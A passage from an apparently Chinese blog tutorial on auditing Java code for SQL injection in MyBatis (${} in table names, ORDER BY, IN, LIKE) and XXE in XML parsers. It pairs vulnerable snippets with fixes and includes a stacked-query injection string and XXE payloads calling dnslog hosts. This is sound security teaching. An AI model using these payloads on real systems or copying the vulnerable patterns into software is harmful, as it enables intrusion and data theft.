<code>UserMapper.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    User <span class="title function_">getUserById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">getAllUsers</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Mapper XML 文件 <code>UserMapper.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.model.User&quot;</span>&gt;</span></span><br><span class="line">        SELECT id, name, email FROM users WHEREid=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAllUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.model.User&quot;</span>&gt;</span></span><br><span class="line">        SELECT id, name, email FROM users</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Java 主程序 <code>Main.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line">publicclassMain&#123;</span><br><span class="line">    publicstaticvoidmain(String[] args)&#123;</span><br><span class="line">        SqlSessionFactorysqlSessionFactory= newSqlSessionFactoryBuilder().build(Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>));</span><br><span class="line">        <span class="keyword">try</span>(SqlSessionsession= sqlSessionFactory.openSession())&#123;</span><br><span class="line">            UserMapperuserMapper= session.getMapper(UserMapper.class);</span><br><span class="line">            Useruser= userMapper.getUserById(<span class="number">1</span>);</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MyBatis中-和-区别"><code>MyBatis</code>中#{}和${}区别</h4><p>在<code>Mybatis</code>中拼接<code>SQL</code>语句有两种方式：一种是占位符 <code>#&#123;&#125;</code> ，另一种是拼接符<code>$&#123;&#125;</code> 。</p><h5 id="对于-：">对于<code>#&#123;&#125;</code>：</h5><p><code>#&#123;&#125;</code> 占位符用于<strong>预编译参数绑定</strong>，<code>MyBatis</code>会把 <code>#&#123;&#125;</code> 中的值<strong>作为参数</strong>传递给数据库查询或更新语句，在执行 <code>SQL</code>时由数据库驱动进行处理。这样做的好处是，<strong>参数会被视为数据，进行转义和预编译</strong>，不会直接拼接到<code>SQL</code>语句中，防止了<code>SQL</code>注入攻击。</p><ul><li><strong>使用场景：</strong> <code>#&#123;&#125;</code> 适用于所有情况，尤其是对于动态条件、查询参数等。比如查询条件、更新值等。</li></ul><p>示例：</p><p>查询的<code>xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应的<code>Java</code>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.getUserById(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>哪么最后在执行时，<code>MyBatis</code> 会将 <code>id</code> 的值 1 绑定到 <code>SQL</code> 查询中，生成的<code>SQL</code>语句会是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>如果传入的数值为1，那么最终会被解析成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> &quot;1&quot;</span><br></pre></td></tr></table></figure><h5 id="对于">对于<code>$&#123;&#125;</code>:</h5><p><code>$&#123;&#125;</code> 用于<strong>直接拼接字符串</strong>。<code>MyBatis</code> 在解析 <code>SQL</code> 时，<code>$&#123;&#125;</code> 不会对传入的参数不做处理，而是直接拼接，<code>MyBatis</code>会把 <code>$&#123;&#125;</code> 中的内容直接替换为对应的参数值，而<strong>不进行任何转义或预处理</strong>，进而会造成<code>SQL</code>注入漏洞。</p><ul><li><strong>使用场景</strong>：<code>$&#123;&#125;</code> 一般用于动态表名、列名、排序字段等场景，通常情况下不应将用户输入的参数直接传入 <code>$&#123;&#125;</code> 中，以防止<code>SQL</code>注入。</li></ul><h4 id="存在SQL注入漏洞的">存在<code>SQL</code>注入漏洞的<code>$&#123;&#125;</code></h4><p>假设我们允许用户通过输入标名查询数据，并且直接用<code>$&#123;&#125;</code>来拼接<code>SQL</code>：</p><p><code>Mapper XML</code>文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByTable&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM $&#123;tableName&#125; WHERE id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的<code>tableName</code>为<code>SQL</code>语句的一部分，直接拼接可导致<code>SQL</code>注入问题。假设注入的数据为<code>users;select database();-- -</code>，查询数据库的名称。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;<span class="keyword">select</span> database();<span class="comment">-- -where id = ?</span></span><br></pre></td></tr></table></figure><p><strong>不存在<code>SQL</code>注入的<code>$&#123;&#125;</code>用法</strong></p><p><code>Mapper XML</code>文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByColumn&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE $&#123;column&#125; = #&#123;value&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应的<code>Java</code>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">column</span> <span class="operator">=</span> <span class="string">&quot;age&quot;</span>; <span class="comment">//用户不可控</span></span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">25</span>; <span class="comment">//用户可控</span></span><br><span class="line">List&lt;User&gt; users = userMapper.findByColumn(column, value);</span><br></pre></td></tr></table></figure><p>最后在执行时，<code>MyBatis</code> 会将 <code>$&#123;column&#125;</code> 替换成 <code>age</code>，而 <code>#&#123;value&#125;</code> 仍然会用 <code>25</code> 作为参数绑定。最终生成的 SQL 语句为：</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> age <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>总之，防止<code>SQL</code>注入的关键点是，作为<code>SQL</code>语句中的**字段部分(为SQL语句的一部分,不使用预编译)**不是用户可以任意控制的，这样就可以有效的防止<code>SQL</code>注入了。例如，上述的案例中<code>age</code>是写死的或者写一个白名单数组，只允许传入白名单数组内的内容，这样用户不可任意控制了也就防止了<code>SQL</code>注入。</p><h3 id="ORDER-BY注入"><code>ORDER BY</code>注入</h3><p><code>ORDER BY</code>语句 ：用于对查询结果的排序，<code>asc</code>为升序，<code>desc</code>为降序。默认为升序。</p><p>比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure><p><code>JDBC</code>中的<code>ORDER BY</code>注入问题，前面已经说过了。</p><p>与<code>JDBC</code>预编译中<code>ORDER BY</code>注入一样，在<code>ORDER BY</code>语句后面需要是字段名或者字段位置。因此也不能使用<code>Mybatis</code>中预编译的方式。</p><p>存在注入的<code>ORDER BY</code>查询，如下<code>UserMapper.xml</code>，这里的<code>sort</code>要可控为任意字符。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderbysqli&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">  select * from users order by $&#123;sort&#125; asc </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>Java</code>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/orderby&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">orderbySql</span><span class="params">(<span class="meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> userMapper.orderbysqli(sort);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IN注入"><code>IN</code>注入</h3><p><code>IN</code>语句：常用于<code>where</code>表达式中，其作用是查询某个范围内的数据。</p><p>比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">where</span> field <span class="keyword">in</span> (value1,value2,value3,…); </span><br></pre></td></tr></table></figure><p>如上所示，<code>IN</code>在查询某个范围数据是会用到多个参数，在<code>Mybtis</code>中如果直接使用占位符 <code>#&#123;&#125;</code>进行查询会将这些参数看做一个整体，<strong>查询会报错</strong>。 因此很多开发人员可能会使用拼接符<code>$&#123;&#125;</code>对参数进行查询，从而造成了SQL注入漏洞。</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span> ($&#123;params&#125;) </span><br></pre></td></tr></table></figure><p>正确的做法是需要使用<code>foreach</code>配合占位符 <code>#&#123;&#125;</code> 实现<code>IN</code>查询。比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- where in 查询场景 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE id IN </span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">item</span>=<span class="string">&quot;id&quot;</span> <span class="attr">collection</span>=<span class="string">&quot;ids&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">        #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>存在<code>SQL</code>注入漏洞的代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE id IN ($&#123;ids&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应的<code>Java</code>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/injection&quot;)</span></span><br><span class="line">publicList&lt;User&gt;INuser(<span class="meta">@RequestParam(&quot;id&quot;)</span> String id)&#123;</span><br><span class="line">  <span class="keyword">return</span> userMapper.INuser(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LIKE注入"><code>LIKE</code>注入</h3><p><code>LIKE</code> 子句用于在<code> SQL</code> 查询中进行模糊匹配。当使用用户输入的内容作为 <code>LIKE</code> 条件时，应该非常小心，因为恶意输入可能导致<code>SQL</code>注入。使用<code>LIKE</code>语句进行查询时如果使用占位符<code>#&#123;&#125;</code>查询时程序会报错。</p><p>因此经验不足的开发人员可能会直接使用拼接符 <code>$&#123;&#125; </code>对参数进行查询，从而造成了SQL注入漏洞。</p><p>这里<code>username</code>任意可控，存在<code>SQL</code>注入的代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;like2&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        select * from users where username like &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>正确的用法，不存在<code>SQL</code>注入漏洞。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserListLikeConcat&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM user WHERE name LIKE concat (&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserListLike&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bind</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27;%&#x27; + name + &#x27;%&#x27;&quot;</span> /&gt;</span></span><br><span class="line">  SELECT * FROM user </span><br><span class="line">  WHERE name LIKE #&#123;pattern&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="SQL相关函数点"><code>SQL</code>相关函数点</h3><p>看了前面的内容，我们可以知道，代码存在<code>SQL</code>注入，其实本质就是将用户的输入当作了<code>SQL</code>语句的字段内容去执行了。想要发现<code>SQL</code>注入漏洞，就要注意在代码中进行<code>SQL</code>语句操作的位置点，仔细查看代码是否正常使用预编译或者是否过滤完全。</p><p>下面给出了涉及<code>SQL</code>语句操作的词语，通过这些词可以快速定位代码中的操作<code>SQL</code>的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Statement</span><br><span class="line">createStatement</span><br><span class="line">PrepareStatement</span><br><span class="line">like <span class="string">&#x27;%$&#123;</span></span><br><span class="line"><span class="string">in($&#123;</span></span><br><span class="line"><span class="string">in ($&#123;</span></span><br><span class="line"><span class="string">select</span></span><br><span class="line"><span class="string">update</span></span><br><span class="line"><span class="string">insert</span></span><br><span class="line"><span class="string">delete</span></span><br><span class="line"><span class="string">$&#123;</span></span><br><span class="line"><span class="string">setObject(</span></span><br><span class="line"><span class="string">setInt(</span></span><br><span class="line"><span class="string">setString(</span></span><br><span class="line"><span class="string">setSQLXML(</span></span><br><span class="line"><span class="string">createQuery(</span></span><br><span class="line"><span class="string">createSQLQuery(</span></span><br><span class="line"><span class="string">createNativeQuery(</span></span><br></pre></td></tr></table></figure><h2 id="XXE">XXE</h2><p>常见的<code>XXE</code>的<code>payload</code>如下：</p><p>测试回显的<code>XXE</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://dnslog.com/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>无回显<code>XXE</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://dnslog.com&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞相关库">漏洞相关库</h3><p>常见的可能存在<code>XXE</code>的相关包<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h3 id="测试实例">测试实例</h3><h4 id="org-xml-sax-XMLReader">org.xml.sax.XMLReader</h4><p>存在<code>XXE</code>漏洞的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLReaderXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建XMLReader实例</span></span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">            <span class="comment">// 构建一个包含XXE漏洞的XML字符串</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// 使用InputSource包装XML字符串</span></span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>();</span><br><span class="line">            inputSource.setCharacterStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.StringReader(xml));</span><br><span class="line">            <span class="comment">// 解析XML</span></span><br><span class="line">            xmlReader.parse(inputSource);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不存在<code>XXE</code>漏洞，参考前辈文章<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建XMLReader实例</span></span><br><span class="line"><span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line"><span class="comment">//在xmlReader后进行setFeature</span></span><br><span class="line"><span class="comment">//第一个是关键的setFeature</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 构建一个包含XXE漏洞的XML字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 使用InputSource包装XML字符串</span></span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>();</span><br><span class="line">inputSource.setCharacterStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.StringReader(xml));</span><br><span class="line"><span class="comment">// 解析XML</span></span><br><span class="line">xmlReader.parse(inputSource);</span><br></pre></td></tr></table></figure><p>这么一看，其实修复<code>XXE</code>漏洞很简单，只要加上<code>setFeature</code>即可。反之，审计的时候，定位相关的<code>xml</code>处理函数，查看是否进行了<code>setFeature</code>操作，即可得到是否存在<code>XXE</code>漏洞。</p><h4 id="org-jdom2-input-SAXBuilder">org.jdom2.input.SAXBuilder</h4><p><code>SAXBuilder</code>如果使用默认配置就会触发<code>XXE</code>漏洞。</p><p>存在<code>XXE</code>漏洞的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SAXBuilderXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span 